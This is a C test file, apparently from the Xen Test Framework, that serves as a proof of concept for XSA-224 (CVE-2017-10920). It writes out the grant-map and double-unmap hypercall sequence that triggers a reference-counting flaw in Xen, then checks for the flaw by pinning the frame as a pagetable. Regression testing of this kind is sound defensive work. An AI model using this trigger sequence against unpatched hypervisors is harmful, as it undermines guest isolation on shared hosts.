/**
 * @file tests/xsa-224/main.c
 * @ref test-xsa-224
 *
 * @page test-xsa-224 XSA-224
 *
 * Advisory: [XSA-224](http://xenbits.xen.org/xsa/advisory-224.html)
 *
 * XSA-224 has multiple CVEs assigned.  This testcase exercises CVE-2017-10920
 * specifically.
 *
 * When a grant is mapped with both host and device mappings as being
 * writeable, and unmapped with two separate unmap hypercalls, one too many
 * references are dropped.  This causes Xen to loose track of one writeable
 * mapping.
 *
 * @see tests/xsa-224/main.c
 */
#include <xtf.h>

#include <arch/pagetable.h>

const char test_title[] = "XSA-224 PoC";

static uint8_t frame[PAGE_SIZE] __page_aligned_bss;

void test_main(void)
{
    int rc = xtf_init_grant_table(1);

    if ( rc )
        return xtf_error("Error initialising grant table: %d\n", rc);

    int domid = xtf_get_domid();

    if ( domid < 0 )
        return xtf_error("Error getting domid\n");

    /*
     * Construct gref 8 to allow frame[] to be mapped by outselves.
     */
    gnttab_v1[8].domid = domid;
    gnttab_v1[8].frame = virt_to_gfn(frame);
    smp_wmb();
    gnttab_v1[8].flags = GTF_permit_access;

    struct gnttab_map_grant_ref map = {
        .host_addr = KB(4),
        .flags = GNTMAP_host_map | GNTMAP_device_map,
        .ref = 8,
        .dom = domid,
        .dev_bus_addr = KB(4),
    };

    /*
     * Map frame[] to ourselves with both host and device mappings.
     */
    rc = hypercall_grant_table_op(GNTTABOP_map_grant_ref, &map, 1);
    if ( rc || map.status )
        return xtf_error("Error: Unable to map grant[8]: %d/%d\n",
                         rc, map.status);

    struct gnttab_unmap_grant_ref unmap = {
        .host_addr = KB(4),
        .handle = map.handle,
    };

    /*
     * Unmap the host mapping of frame[] in isolation.
     */
    rc = hypercall_grant_table_op(GNTTABOP_unmap_grant_ref, &unmap, 1);
    if ( rc || unmap.status )
        return xtf_error("Error: Unable to host unmap grant[8]: %d/%d\n",
                         rc, unmap.status);

    /*
     * Unmap the device mapping of frame[] in isolation.
     */
    unmap.host_addr = 0;
    unmap.dev_bus_addr = virt_to_maddr(frame);

    rc = hypercall_grant_table_op(GNTTABOP_unmap_grant_ref, &unmap, 1);
    if ( rc || unmap.status )
        return xtf_error("Error: Unable to bus unmap grant[8]: %d/%d\n",
                         rc, unmap.status);

    /*
     * At this point, if Xen is vulnerable to XSA-224, it will have dropped
     * one too many writeable refs from frame[].  Check, by trying to pin it
     * as a pagetable.
     */
    mmuext_op_t op =
    {
        .cmd = MMUEXT_PIN_L1_TABLE,
        .arg1.mfn = virt_to_mfn(frame),
    };

    rc = hypercall_mmuext_op(&op, 1, NULL, DOMID_SELF);

    switch ( rc )
    {
    case 0:
        return xtf_failure("Fail: Vulnerable to XSA-224\n");

    case -EINVAL:
        return xtf_success("Success: Not vulnerable to XSA-224\n");

    default:
        return xtf_error("Unexpected MMUEXT_PIN_L1_TABLE rc %d\n", rc);
    }
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
